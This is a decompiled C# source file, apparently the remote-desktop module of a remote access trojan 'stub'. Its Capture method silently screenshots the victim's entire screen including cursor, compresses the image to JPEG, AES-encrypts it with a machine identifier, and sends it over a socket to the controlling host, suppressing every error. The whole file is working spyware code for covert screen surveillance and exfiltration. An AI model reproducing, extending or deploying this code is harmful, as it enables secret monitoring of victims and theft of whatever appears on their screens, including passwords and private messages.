using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class RemoteDesktop
{
	public static void Capture(int W, int H, int qq)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Expected O, but got Unknown
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.set_CompositingQuality((CompositingQuality)1);
			Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
			Size size = new Size(rectangle.Width, Screen.get_PrimaryScreen().get_Bounds().Height);
			val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
			size = new Size(32, 32);
			object obj = size;
			Size size2 = default(Size);
			rectangle = new Rectangle(Cursor.get_Position(), (obj != null) ? ((Size)obj) : size2);
			object obj2 = rectangle;
			Rectangle rectangle2 = default(Rectangle);
			Cursors.get_Default().Draw(val2, (obj2 != null) ? ((Rectangle)obj2) : rectangle2);
			Bitmap val3 = new Bitmap(W, H);
			Graphics val4 = Graphics.FromImage((Image)(object)val3);
			val4.set_CompositingQuality((CompositingQuality)1);
			rectangle = new Rectangle(0, 0, W, H);
			Rectangle rectangle3 = rectangle;
			Rectangle rectangle4 = new Rectangle(0, 0, Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
			val4.DrawImage((Image)(object)val, rectangle3, rectangle4, (GraphicsUnit)2);
			EncoderParameter val5 = new EncoderParameter(Encoder.Quality, (long)qq);
			ImageCodecInfo encoderInfo = GetEncoderInfo(ImageFormat.get_Jpeg());
			EncoderParameters val6 = new EncoderParameters(1);
			val6.get_Param()[0] = val5;
			MemoryStream memoryStream = new MemoryStream();
			((Image)val3).Save((Stream)memoryStream, encoderInfo, val6);
			try
			{
				lock (ClientSocket.S)
				{
					using MemoryStream memoryStream2 = new MemoryStream();
					object obj3 = Screen.get_PrimaryScreen().get_Bounds().Size;
					byte[] array = Helper.AES_Encryptor(Helper.SB(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"RD+", ClientSocket.SPL), (object)Helper.BS(memoryStream.ToArray())), ClientSocket.SPL), NewLateBinding.LateGet(obj3, (Type)null, "Width", new object[0], (string[])null, (Type[])null, (bool[])null)), ClientSocket.SPL), NewLateBinding.LateGet(obj3, (Type)null, "Height", new object[0], (string[])null, (Type[])null, (bool[])null)), ClientSocket.SPL), (object)Helper.ID()))));
					byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
					memoryStream2.Write(array2, 0, array2.Length);
					memoryStream2.Write(array, 0, array.Length);
					ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
					ClientSocket.S.Send(memoryStream2.ToArray(), 0, checked((int)memoryStream2.Length), SocketFlags.None);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ClientSocket.isConnected = false;
				ProjectData.ClearProjectError();
			}
			try
			{
				val2.Dispose();
				val4.Dispose();
				((Image)val).Dispose();
				memoryStream.Dispose();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
	}

	public static ImageCodecInfo GetEncoderInfo(ImageFormat format)
	{
		//Discarded unreachable code: IL_0033
		ImageCodecInfo result = default(ImageCodecInfo);
		try
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			for (int i = 0; i < imageEncoders.Length; i = checked(i + 1))
			{
				if (imageEncoders[i].get_FormatID() == format.get_Guid())
				{
					result = imageEncoders[i];
					return result;
				}
			}
			result = null;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
